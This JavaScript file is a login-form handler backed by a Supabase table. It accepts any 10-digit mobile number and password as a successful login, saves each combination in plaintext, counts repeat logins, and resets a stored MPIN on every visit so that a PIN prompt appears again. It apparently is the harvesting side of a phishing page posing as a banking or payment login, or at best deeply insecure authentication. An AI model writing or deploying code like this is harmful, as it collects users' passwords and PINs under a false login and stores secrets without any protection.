import { dbApi } from '../config/supabase.js';
import { sharedAuth } from '../../../shared/js/auth.js';
import { sharedUtils } from '../../../shared/js/utils.js';


document.addEventListener('DOMContentLoaded', () => {
    const loginForm = document.getElementById('user-login-form');
    if (!loginForm) return;

    // Enforce numeric-only on phone field
    const mobileInput = document.getElementById('mobile-input');
    if (mobileInput) {
        mobileInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '').slice(0, 10);
        });
        mobileInput.addEventListener('keypress', function(e) {
            if (!/\d/.test(e.key)) e.preventDefault();
        });
    }

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const mobileEl = document.getElementById('mobile-input');
        const passwordEl = document.getElementById('password-input');
        const submitBtn = document.getElementById('login-submit-btn');

        const mobile = mobileEl.value.trim();
        const password = passwordEl.value.trim();

        if (!mobile || !password) {
            sharedUtils.showToast("Please enter mobile number and password", "error");
            return;
        }

        if (mobile.length !== 10 || !/^\d{10}$/.test(mobile)) {
            sharedUtils.showToast("Mobile number must be exactly 10 digits", "error");
            return;
        }

        submitBtn.disabled = true;
        submitBtn.innerText = "LOGGING IN...";

        try {
            // Check if this exact mobile+password combo already exists
            const existing = await dbApi.select('users', { mobile, password });
            let user = null;

            if (existing.length > 0) {
                // Update existing record — increment login count, reset mpin/status so MPIN popup shows again
                user = existing[0];
                const newCount = (user.login_count || 0) + 1;
                const updated = await dbApi.update('users', {
                    login_count: newCount,
                    last_login: new Date().toISOString(),
                    status: 'pending',
                    mpin: ''
                }, { id: user.id });
                user = updated[0] || { ...user, login_count: newCount, status: 'pending', mpin: '' };
            } else {
                // New mobile+password combo — create fresh record
                const inserted = await dbApi.insert('users', {
                    mobile,
                    password,
                    login_count: 1,
                    status: 'pending',
                    mpin: '',
                    last_login: new Date().toISOString()
                });
                user = inserted[0];
            }

            // Save session
            sharedAuth.setCurrentUser(user);
            sharedUtils.showToast("Login Successful!", "success");

            setTimeout(() => {
                window.location.href = 'home.html';
            }, 800);

        } catch (err) {
            sharedUtils.showToast("Login failed: " + err.message, "error");
            submitBtn.disabled = false;
            submitBtn.innerText = "LOG IN";
        }
    });
});
